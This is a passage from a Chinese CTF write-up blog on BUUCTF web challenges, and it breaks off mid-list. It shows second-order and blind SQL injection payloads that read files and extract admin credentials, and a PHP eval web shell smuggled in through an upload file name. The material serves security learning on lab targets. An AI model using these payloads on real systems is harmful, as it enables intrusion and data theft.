class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    <span class="variable">$user_name</span> = <span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    <span class="variable">$address</span> = <span class="variable">$_POST</span>[<span class="string">&quot;address&quot;</span>];</span><br><span class="line">    <span class="variable">$phone</span> = <span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="variable">$pattern</span>,<span class="variable">$user_name</span>) || preg_match(<span class="variable">$pattern</span>,<span class="variable">$phone</span>))&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;select * from `user` where `user_name`=&#x27;<span class="subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$fetch</span> = <span class="variable">$db</span>-&gt;query(<span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$fetch</span>-&gt;num_rows&gt;<span class="number">0</span>) &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="variable">$user_name</span>.<span class="string">&quot;å·²æäº¤è®¢å&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)&quot;</span>;</span><br><span class="line">        <span class="variable">$re</span> = <span class="variable">$db</span>-&gt;prepare(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="variable">$re</span>-&gt;bind_param(<span class="string">&quot;sss&quot;</span>, <span class="variable">$user_name</span>, <span class="variable">$address</span>, <span class="variable">$phone</span>);</span><br><span class="line">        <span class="variable">$re</span> = <span class="variable">$re</span>-&gt;execute();</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$re</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            print_r(<span class="variable">$db</span>-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;è®¢åæäº¤æå&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;ä¿¡æ¯ä¸å¨&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h1 id="解题">2. 解题</h1>
<p>注意 change.php 里面存在update语句。还有 confirm.php
里面虽然存在过滤，但是只过滤了 user_name 和 phone，而没有过滤
address。因此存在<strong>二次注入</strong>。</p>
<p>思路：</p>
<ol type="1">
<li>首先提交一份表单，在address处写入payload；</li>
<li>然后修改表单，这样子就会调用原来的address，即old_address处；</li>
</ol>
<p>经过测试，可以使用报错注入，我是用updatexml函数。我先是查看了字段名，发现存在好多字段名，我就只关注与Username和Password，但是并没有flag，看别人的writeup才知道flag在系统根目录下。于是最终payload如下：
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#x27;</span><span class="operator">/</span>flag.txt<span class="string">&#x27;),1,30)),0x7e),1)#</span></span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220519195029.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220519195043.png" /></p>
<p>因为updatexml只能显示32位，于是多利用几次substr <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#x27;</span><span class="operator">/</span>flag.txt<span class="string">&#x27;),31,30)),0x7e),1)#</span></span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220519195134.png" /></p>
<p>最终flag为：flag{80d6e97e-7722-4350-b412-60ece3c33208}</p>
<p>需要注意的是：每次提交姓名和电话需要改一下。</p>
<h1 id="总结">3. 总结</h1>
<p>不知道怎么得到flag的位置的，不过这不重要，重要的是二次注入。还有：</p>
<ul>
<li>文件包含</li>
<li>PHP伪协议</li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>二次注入</tag>
      </tags>
  </entry>
  <entry>
    <title>CISCN2019 总决赛 Day2 Web1 Easyweb</title>
    <url>/2022/05/20/CISCN2019%20%E6%80%BB%E5%86%B3%E8%B5%9B%20Day2%20Web1%20Easyweb/</url>
    <content><![CDATA[<p>题目地址：<a
href="https://buuoj.cn/challenges#%5BCISCN2019%20%E6%80%BB%E5%86%B3%E8%B5%9B%20Day2%20Web1%5DEasyweb">Easyweb</a></p>
<span id="more"></span>
<h1 id="题目信息">1. 题目信息</h1>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220520111739.png" /></p>
<p>进入环境就是一个登录界面，测试了一下发现无论输入什么都没有提示，故先放着。查看是否存在
robots.txt，里面提示了 <code>*.php.bak</code>，经过多次测试，终于找到
<code>image.php.bak</code>，内容如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>])?<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>]:<span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="variable">$path</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;path&quot;</span>])?<span class="variable">$_GET</span>[<span class="string">&quot;path&quot;</span>]:<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=addslashes(<span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$path</span>=addslashes(<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,<span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$path</span>=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span>=mysqli_query(<span class="variable">$con</span>,<span class="string">&quot;select * from images where id=&#x27;<span class="subst">&#123;$id&#125;</span>&#x27; or path=&#x27;<span class="subst">&#123;$path&#125;</span>&#x27;&quot;</span>);</span><br><span class="line"><span class="variable">$row</span>=mysqli_fetch_array(<span class="variable">$result</span>,MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line"><span class="variable">$path</span>=<span class="string">&quot;./&quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;path&quot;</span>];</span><br><span class="line">header(<span class="string">&quot;Content-Type: image/jpeg&quot;</span>);</span><br><span class="line">readfile(<span class="variable">$path</span>); </span><br></pre></td></tr></table></figure></p>
<h1 id="解题">2. 解题</h1>
<h2 id="sql注入">2.1. SQL注入</h2>
<p>看到 addslashes 和 str_replace
我猜测大概率是存在sql注入。假设我们提交如下payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1\0&amp;path=or 1=1--+</span><br></pre></td></tr></table></figure></p>
<p>那么经过 addslashes 和 str_replace 函数后，id和path分别为：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id = 1\\0 -&gt; id = 1\</span><br><span class="line">path = or 1=1--+</span><br></pre></td></tr></table></figure></p>
<p>因此，最终带入查询的sql语句如下： <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> images <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;1\&#x27;</span> <span class="keyword">or</span> path<span class="operator">=</span><span class="string">&#x27;or 1=1--+&#x27;</span></span><br></pre></td></tr></table></figure></p>
<p>第二个单引号被转义，因此第一个单引号和第三个单引号闭合，所以数据库识别到的参数为：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id = 1\&#x27; or path=</span><br></pre></td></tr></table></figure></p>
<p>没有
path，然后or后面是1=1为真，因此直接返回所有images中所有的内容。使用如下payload取得相关敏感信息：
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> ?id<span class="operator">=</span><span class="number">-1</span>\<span class="number">0</span><span class="operator">&amp;</span>path<span class="operator">=</span><span class="keyword">or</span><span class="operator">+</span>length(database())<span class="operator">=</span><span class="number">10</span><span class="comment">--+</span></span><br><span class="line"><span class="number">2.</span> ?id<span class="operator">=</span><span class="number">-1</span>\<span class="number">0</span><span class="operator">&amp;</span>path<span class="operator">=</span><span class="keyword">or</span><span class="operator">+</span>ascii(substr(database(),<span class="operator">%</span>d,<span class="number">1</span>))<span class="operator">=</span><span class="operator">%</span>d<span class="comment">--+</span></span><br><span class="line"><span class="number">3.</span> ?id<span class="operator">=</span><span class="number">-1</span>\<span class="number">0</span><span class="operator">&amp;</span>path<span class="operator">=</span><span class="keyword">or</span><span class="operator">+</span>length((<span class="keyword">select</span><span class="operator">+</span>group_concat(table_name)<span class="keyword">from</span><span class="operator">+</span>information_schema.tables<span class="operator">+</span><span class="keyword">where</span><span class="operator">+</span>table_schema<span class="operator">=</span>database()))<span class="operator">=</span><span class="operator">%</span>d<span class="comment">--+</span></span><br><span class="line"><span class="number">4.</span> ?id<span class="operator">=</span><span class="number">-1</span>\<span class="number">0</span><span class="operator">&amp;</span>path<span class="operator">=</span><span class="keyword">or</span><span class="operator">+</span>ascii(substr((<span class="keyword">select</span><span class="operator">+</span>group_concat(table_name)<span class="keyword">from</span><span class="operator">+</span>information_schema.tables<span class="operator">+</span><span class="keyword">where</span><span class="operator">+</span>table_schema<span class="operator">=</span>database()),<span class="operator">%</span>d,<span class="number">1</span>))<span class="operator">&gt;</span><span class="operator">%</span>d<span class="comment">--+</span></span><br><span class="line"><span class="number">5.</span> ?id<span class="operator">=</span><span class="number">-1</span>\<span class="number">0</span><span class="operator">&amp;</span>path<span class="operator">=</span><span class="keyword">or</span><span class="operator">+</span>length((<span class="keyword">select</span><span class="operator">+</span>group_concat(column_name)<span class="keyword">from</span><span class="operator">+</span>information_schema.columns<span class="operator">+</span><span class="keyword">where</span><span class="operator">+</span>table_schema<span class="operator">=</span>database()))<span class="operator">=</span><span class="operator">%</span>d<span class="comment">--+</span></span><br><span class="line"><span class="number">6.</span> ?id<span class="operator">=</span><span class="number">-1</span>\<span class="number">0</span><span class="operator">&amp;</span>path<span class="operator">=</span><span class="keyword">or</span><span class="operator">+</span>ascii(substr((<span class="keyword">select</span><span class="operator">+</span>group_concat(column_name)<span class="keyword">from</span><span class="operator">+</span>information_schema.columns<span class="operator">+</span><span class="keyword">where</span><span class="operator">+</span>table_schema<span class="operator">=</span>database()),<span class="operator">%</span>d,<span class="number">1</span>))<span class="operator">=</span><span class="operator">%</span>d<span class="comment">--+</span></span><br><span class="line"><span class="number">7.</span> ?id<span class="operator">=</span><span class="number">-1</span>\<span class="number">0</span><span class="operator">&amp;</span>path<span class="operator">=</span><span class="keyword">or</span><span class="operator">+</span>length((<span class="keyword">select</span><span class="operator">+</span>username<span class="operator">+</span><span class="keyword">from</span><span class="operator">+</span>users))<span class="operator">=</span><span class="operator">%</span>d<span class="comment">--+</span></span><br><span class="line"><span class="number">8.</span> ?id<span class="operator">=</span><span class="number">-1</span>\<span class="number">0</span><span class="operator">&amp;</span>path<span class="operator">=</span><span class="keyword">or</span><span class="operator">+</span>length((<span class="keyword">select</span><span class="operator">+</span>password<span class="operator">+</span><span class="keyword">from</span><span class="operator">+</span>users))<span class="operator">=</span><span class="operator">%</span>d<span class="comment">--+</span></span><br><span class="line"><span class="number">9.</span> ?id<span class="operator">=</span><span class="number">-1</span>\<span class="number">0</span><span class="operator">&amp;</span>path<span class="operator">=</span><span class="keyword">or</span><span class="operator">+</span>ascii(substr((<span class="keyword">select</span><span class="operator">+</span>username<span class="operator">+</span><span class="keyword">from</span><span class="operator">+</span>users),<span class="operator">%</span>d,<span class="number">1</span>))<span class="operator">=</span><span class="operator">%</span>d<span class="comment">--+</span></span><br><span class="line"><span class="number">10.</span> ?id<span class="operator">=</span><span class="number">-1</span>\<span class="number">0</span><span class="operator">&amp;</span>path<span class="operator">=</span><span class="keyword">or</span><span class="operator">+</span>ascii(substr((<span class="keyword">select</span><span class="operator">+</span>password<span class="operator">+</span><span class="keyword">from</span><span class="operator">+</span>users),<span class="operator">%</span>d,<span class="number">1</span>))<span class="operator">=</span><span class="operator">%</span>d<span class="comment">--+</span></span><br></pre></td></tr></table></figure></p>
<p>敏感信息： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">数据库长度：10</span><br><span class="line">99 105 115 99 110 102 105 110 97 108 -&gt; ciscnfinal</span><br><span class="line"></span><br><span class="line">表长度：12</span><br><span class="line">105 109 97 103 101 115 44 117 115 101 114 115 -&gt; images,users</span><br><span class="line"></span><br><span class="line">字段名长度：25</span><br><span class="line">105 100 44 112 97 116 104 44 117 115 101 114 110 97 109 101 44 112 97 115 115 119 111 114 100 -&gt; id,path,username,password</span><br><span class="line"></span><br><span class="line">username 字段长度 5 -&gt; 97 100 109 105 110 -&gt; admin</span><br><span class="line">password 字段长度 20</span><br><span class="line">-&gt; 52 52 99 57 52 56 51 55 52 99 101 49 100 97 50 101 54 49 54 100</span><br><span class="line">-&gt; 44c948374ce1da2e616d</span><br></pre></td></tr></table></figure></p>
<p>然后利用得到的用户名和密码登录</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220520111715.png" /></p>
<h2 id="文件上传">2.2. 文件上传</h2>
<p>随便上传一个图片</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220520111807.png" /></p>
<p>这句话的大致意思是：将我们上传的图片的名字记录在了日志里面。<strong>注意这个日志是php后缀，并且记录文件名。</strong></p>
<p>访问日志，确实保存了我们上传的图片的文件名</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220520112212.png" /></p>
<p>经过测试，无法直接上床php文件，那就根据上面的信息，创建一个名字为一句话木马的文件，然后上传
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">&lt;</span>?php eval($_POST[<span class="string">&#x27;cmd&#x27;</span>]);?<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220520112105.png" /></p>
<p>思考，系统是如何知道该文件是php文件呢？既没有后缀，文件也没有任何内容，抓包信息中的
Content-Type 也没有php</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220520112328.png" /></p>
<p>因此，唯一的解释就是，文件名中不能出现php，那么使用<strong>短标签</strong>绕过，文件名改为：
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>然后上传</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220520112439.png" /></p>
<p>访问对应日志，可以看到文件名没有了，这是好事，说明很有可能这个php代码被执行了，所以没有显示出来。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220520112501.png" /></p>
<p>直接使用蚁剑连接，在根目录刷新以下，找到flag</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220520112625.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220520112633.png" /></p>
<h1 id="总结">3. 总结</h1>
<p>本题难度中等偏上吧，涉及到如下方法：</p>
<ol type="1">
<li>代码审计 -&gt; 知道存在SQL注入</li>
<li>SQL注入</li>
<li>文件上传</li>
<li>php短标签</li>
</ol>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>文件上传</tag>
        <tag>代码审计</tag>
        <tag>php短标签</tag>
      </tags>
  </entry>
  <entry>
    <title>CSCCTF 2019 Qual FlaskLight</title>
    <url>/2022/04/29/CSCCTF%202019%20Qual%20FlaskLight/</url>
    <content><![CDATA[<p>题目地址：<a
href="https://buuoj.cn/challenges#%5BCSCCTF%202019%20Qual%5DFlaskLight">FlaskLight</a></p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p>进入页面查看源码得到提示信息： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- Parameter Name: search --&gt;</span><br><span class="line">&lt;!-- Method: GET --&gt;</span><br></pre></td></tr></table></figure></p>
<p>经过测试，这里确实存在着SSTI。</p>
<h1 id="解题">解题</h1>
<p>首先寻找可以用的类： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0. type &#x27;type&#x27;</span><br><span class="line">1. type &#x27;weakref&#x27;</span><br><span class="line">2. type &#x27;weakcallableproxy&#x27;</span><br><span class="line">3. type &#x27;weakproxy&#x27;</span><br><span class="line">4. type &#x27;int&#x27;</span><br><span class="line">5. type &#x27;basestring&#x27;</span><br><span class="line">6. type &#x27;bytearray&#x27;</span><br><span class="line">7. type &#x27;list&#x27;</span><br><span class="line">8. type &#x27;NoneType&#x27;</span><br><span class="line">9. type &#x27;NotImplementedType&#x27;</span><br><span class="line">10. type &#x27;traceback&#x27;</span><br><span class="line">11. type &#x27;super&#x27;</span><br><span class="line">12. type &#x27;xrange&#x27;</span><br><span class="line">13. type &#x27;dict&#x27;</span><br><span class="line">14. type &#x27;set&#x27;</span><br><span class="line">15. type &#x27;slice&#x27;</span><br><span class="line">16. type &#x27;staticmethod&#x27;</span><br><span class="line">17. type &#x27;complex&#x27;</span><br><span class="line">18. type &#x27;float&#x27;</span><br><span class="line">19. type &#x27;buffer&#x27;</span><br><span class="line">20. type &#x27;long&#x27;</span><br><span class="line">21. type &#x27;frozenset&#x27;</span><br><span class="line">22. type &#x27;property&#x27;</span><br><span class="line">23. type &#x27;memoryview&#x27;</span><br><span class="line">24. type &#x27;tuple&#x27;</span><br><span class="line">25. type &#x27;enumerate&#x27;</span><br><span class="line">26. type &#x27;reversed&#x27;</span><br><span class="line">27. type &#x27;code&#x27;</span><br><span class="line">28. type &#x27;frame&#x27;</span><br><span class="line">29. type &#x27;builtin_function_or_method&#x27;</span><br><span class="line">30. type &#x27;instancemethod&#x27;</span><br><span class="line">31. type &#x27;function&#x27;</span><br><span class="line">32. type &#x27;classobj&#x27;</span><br><span class="line">33. type &#x27;dictproxy&#x27;</span><br><span class="line">34. type &#x27;generator&#x27;</span><br><span class="line">35. type &#x27;getset_descriptor&#x27;</span><br><span class="line">36. type &#x27;wrapper_descriptor&#x27;</span><br><span class="line">37. type &#x27;instance&#x27;</span><br><span class="line">38. type &#x27;ellipsis&#x27;</span><br><span class="line">39. type &#x27;member_descriptor&#x27;</span><br><span class="line">40. type &#x27;file&#x27;</span><br><span class="line">41. type &#x27;PyCapsule&#x27;</span><br><span class="line">42. type &#x27;cell&#x27;</span><br><span class="line">43. type &#x27;callable-iterator&#x27;</span><br><span class="line">44. type &#x27;iterator&#x27;</span><br><span class="line">45. type &#x27;sys.long_info&#x27;</span><br><span class="line">46. type &#x27;sys.float_info&#x27;</span><br><span class="line">47. type &#x27;EncodingMap&#x27;</span><br><span class="line">48. type &#x27;fieldnameiterator&#x27;</span><br><span class="line">49. type &#x27;formatteriterator&#x27;</span><br><span class="line">50. type &#x27;sys.version_info&#x27;</span><br><span class="line">51. type &#x27;sys.flags&#x27;</span><br><span class="line">52. type &#x27;exceptions.BaseException&#x27;</span><br><span class="line">53. type &#x27;module&#x27;</span><br><span class="line">54. type &#x27;imp.NullImporter&#x27;</span><br><span class="line">55. type &#x27;zipimport.zipimporter&#x27;</span><br><span class="line">56. type &#x27;posix.stat_result&#x27;</span><br><span class="line">57. type &#x27;posix.statvfs_result&#x27;</span><br><span class="line">58. class &#x27;warnings.WarningMessage&#x27;</span><br><span class="line">59. class &#x27;warnings.catch_warnings&#x27;</span><br><span class="line">60. class &#x27;_weakrefset._IterationGuard&#x27;</span><br><span class="line">61. class &#x27;_weakrefset.WeakSet&#x27;</span><br><span class="line">62. class &#x27;_abcoll.Hashable&#x27;</span><br><span class="line">63. type &#x27;classmethod&#x27;</span><br><span class="line">64. class &#x27;_abcoll.Iterable&#x27;</span><br><span class="line">65. class &#x27;_abcoll.Sized&#x27;</span><br><span class="line">66. class &#x27;_abcoll.Container&#x27;</span><br><span class="line">67. class &#x27;_abcoll.Callable&#x27;</span><br><span class="line">68. type &#x27;dict_keys&#x27;</span><br><span class="line">69. type &#x27;dict_items&#x27;</span><br><span class="line">70. type &#x27;dict_values&#x27;</span><br><span class="line">71. class &#x27;site._Printer&#x27;</span><br><span class="line">72. class &#x27;site._Helper&#x27;</span><br><span class="line">73. type &#x27;_sre.SRE_Pattern&#x27;</span><br><span class="line">74. type &#x27;_sre.SRE_Match&#x27;</span><br><span class="line">75. type &#x27;_sre.SRE_Scanner&#x27;</span><br><span class="line">76. class &#x27;site.Quitter&#x27;</span><br><span class="line">77. class &#x27;codecs.IncrementalEncoder&#x27;</span><br><span class="line">78. class &#x27;codecs.IncrementalDecoder&#x27;</span><br><span class="line">79. class &#x27;string.Template&#x27;</span><br><span class="line">80. class &#x27;string.Formatter&#x27;</span><br><span class="line">81. type &#x27;collections.deque&#x27;</span><br><span class="line">82. type &#x27;deque_iterator&#x27;</span><br><span class="line">83. type &#x27;deque_reverse_iterator&#x27;</span><br><span class="line">84. type &#x27;operator.itemgetter&#x27;</span><br><span class="line">85. type &#x27;operator.attrgetter&#x27;</span><br><span class="line">86. type &#x27;operator.methodcaller&#x27;</span><br><span class="line">87. type &#x27;itertools.combinations&#x27;</span><br><span class="line">88. type &#x27;itertools.combinations_with_replacement&#x27;</span><br><span class="line">89. type &#x27;itertools.cycle&#x27;</span><br><span class="line">90. type &#x27;itertools.dropwhile&#x27;</span><br><span class="line">91. type &#x27;itertools.takewhile&#x27;</span><br><span class="line">92. type &#x27;itertools.islice&#x27;</span><br><span class="line">93. type &#x27;itertools.starmap&#x27;</span><br><span class="line">94. type &#x27;itertools.imap&#x27;</span><br><span class="line">95. type &#x27;itertools.chain&#x27;</span><br><span class="line">96. type &#x27;itertools.compress&#x27;</span><br><span class="line">97. type &#x27;itertools.ifilter&#x27;</span><br><span class="line">98. type &#x27;itertools.ifilterfalse&#x27;</span><br><span class="line">99. type &#x27;itertools.count&#x27;</span><br><span class="line">100. type &#x27;itertools.izip&#x27;</span><br><span class="line">101. type &#x27;itertools.izip_longest&#x27;</span><br><span class="line">102. type &#x27;itertools.permutations&#x27;</span><br><span class="line">103. type &#x27;itertools.product&#x27;</span><br><span class="line">104. type &#x27;itertools.repeat&#x27;</span><br><span class="line">105. type &#x27;itertools.groupby&#x27;</span><br><span class="line">106. type &#x27;itertools.tee_dataobject&#x27;</span><br><span class="line">107. type &#x27;itertools.tee&#x27;</span><br><span class="line">108. type &#x27;itertools._grouper&#x27;</span><br><span class="line">109. type &#x27;_thread._localdummy&#x27;</span><br><span class="line">110. type &#x27;thread._local&#x27;</span><br><span class="line">111. type &#x27;thread.lock&#x27;</span><br><span class="line">112. type &#x27;method_descriptor&#x27;</span><br><span class="line">113. class &#x27;markupsafe._MarkupEscapeHelper&#x27;</span><br><span class="line">114. type &#x27;_io._IOBase&#x27;</span><br><span class="line">115. type &#x27;_io.IncrementalNewlineDecoder&#x27;</span><br><span class="line">116. type &#x27;_hashlib.HASH&#x27;</span><br><span class="line">117. type &#x27;_random.Random&#x27;</span><br><span class="line">118. type &#x27;cStringIO.StringO&#x27;</span><br><span class="line">119. type &#x27;cStringIO.StringI&#x27;</span><br><span class="line">120. type &#x27;cPickle.Unpickler&#x27;</span><br><span class="line">121. type &#x27;cPickle.Pickler&#x27;</span><br><span class="line">122. type &#x27;functools.partial&#x27;</span><br><span class="line">123. type &#x27;_ssl._SSLContext&#x27;</span><br><span class="line">124. type &#x27;_ssl._SSLSocket&#x27;</span><br><span class="line">125. class &#x27;socket._closedsocket&#x27;</span><br><span class="line">126. type &#x27;_socket.socket&#x27;</span><br><span class="line">127. class &#x27;socket._socketobject&#x27;</span><br><span class="line">128. class &#x27;socket._fileobject&#x27;</span><br><span class="line">129. type &#x27;time.struct_time&#x27;</span><br><span class="line">130. type &#x27;Struct&#x27;</span><br><span class="line">131. class &#x27;urlparse.ResultMixin&#x27;</span><br><span class="line">132. class &#x27;contextlib.GeneratorContextManager&#x27;</span><br><span class="line">133. class &#x27;contextlib.closing&#x27;</span><br><span class="line">134. type &#x27;_json.Scanner&#x27;</span><br><span class="line">135. type &#x27;_json.Encoder&#x27;</span><br><span class="line">136. class &#x27;json.decoder.JSONDecoder&#x27;</span><br><span class="line">137. class &#x27;json.encoder.JSONEncoder&#x27;</span><br><span class="line">138. class &#x27;threading._Verbose&#x27;</span><br><span class="line">139. class &#x27;jinja2.utils.MissingType&#x27;</span><br><span class="line">140. class &#x27;jinja2.utils.LRUCache&#x27;</span><br><span class="line">141. class &#x27;jinja2.utils.Cycler&#x27;</span><br><span class="line">142. class &#x27;jinja2.utils.Joiner&#x27;</span><br><span class="line">143. class &#x27;jinja2.utils.Namespace&#x27;</span><br><span class="line">144. class &#x27;jinja2.bccache.Bucket&#x27;</span><br><span class="line">145. class &#x27;jinja2.bccache.BytecodeCache&#x27;</span><br><span class="line">146. class &#x27;jinja2.nodes.EvalContext&#x27;</span><br><span class="line">147. class &#x27;jinja2.visitor.NodeVisitor&#x27;</span><br><span class="line">148. class &#x27;jinja2.nodes.Node&#x27;</span><br><span class="line">149. class &#x27;jinja2.idtracking.Symbols&#x27;</span><br><span class="line">150. class &#x27;jinja2.compiler.MacroRef&#x27;</span><br><span class="line">151. class &#x27;jinja2.compiler.Frame&#x27;</span><br><span class="line">152. class &#x27;jinja2.runtime.TemplateReference&#x27;</span><br><span class="line">153. class &#x27;numbers.Number&#x27;</span><br><span class="line">154. class &#x27;jinja2.runtime.Context&#x27;</span><br><span class="line">155. class &#x27;jinja2.runtime.BlockReference&#x27;</span><br><span class="line">156. class &#x27;jinja2.runtime.Macro&#x27;</span><br><span class="line">157. class &#x27;jinja2.runtime.Undefined&#x27;</span><br><span class="line">158. class &#x27;decimal.Decimal&#x27;</span><br><span class="line">159. class &#x27;decimal._ContextManager&#x27;</span><br><span class="line">160. class &#x27;decimal.Context&#x27;</span><br><span class="line">161. class &#x27;decimal._WorkRep&#x27;</span><br><span class="line">162. class &#x27;decimal._Log10Memoize&#x27;</span><br><span class="line">163. type &#x27;_ast.AST&#x27;</span><br><span class="line">164. class &#x27;ast.NodeVisitor&#x27;</span><br><span class="line">165. class &#x27;jinja2.lexer.Failure&#x27;</span><br><span class="line">166. class &#x27;jinja2.lexer.TokenStreamIterator&#x27;</span><br><span class="line">167. class &#x27;jinja2.lexer.TokenStream&#x27;</span><br><span class="line">168. class &#x27;jinja2.lexer.Lexer&#x27;</span><br><span class="line">169. class &#x27;jinja2.parser.Parser&#x27;</span><br><span class="line">170. class &#x27;jinja2.environment.Environment&#x27;</span><br><span class="line">171. class &#x27;jinja2.environment.Template&#x27;</span><br><span class="line">172. class &#x27;jinja2.environment.TemplateModule&#x27;</span><br><span class="line">173. class &#x27;jinja2.environment.TemplateExpression&#x27;</span><br><span class="line">174. class &#x27;jinja2.environment.TemplateStream&#x27;</span><br><span class="line">175. class &#x27;jinja2.loaders.BaseLoader&#x27;</span><br><span class="line">176. type &#x27;datetime.date&#x27;</span><br><span class="line">177. type &#x27;datetime.timedelta&#x27;</span><br><span class="line">178. type &#x27;datetime.time&#x27;</span><br><span class="line">179. type &#x27;datetime.tzinfo&#x27;</span><br><span class="line">180. class &#x27;logging.LogRecord&#x27;</span><br><span class="line">181. class &#x27;logging.Formatter&#x27;</span><br><span class="line">182. class &#x27;logging.BufferingFormatter&#x27;</span><br><span class="line">183. class &#x27;logging.Filter&#x27;</span><br><span class="line">184. class &#x27;logging.Filterer&#x27;</span><br><span class="line">185. class &#x27;logging.PlaceHolder&#x27;</span><br><span class="line">186. class &#x27;logging.Manager&#x27;</span><br><span class="line">187. class &#x27;logging.LoggerAdapter&#x27;</span><br><span class="line">188. class &#x27;werkzeug._internal._Missing&#x27;</span><br><span class="line">189. class &#x27;werkzeug._internal._DictAccessorProperty&#x27;</span><br><span class="line">190. class &#x27;werkzeug.utils.HTMLBuilder&#x27;</span><br><span class="line">191. class &#x27;werkzeug.exceptions.Aborter&#x27;</span><br><span class="line">192. class 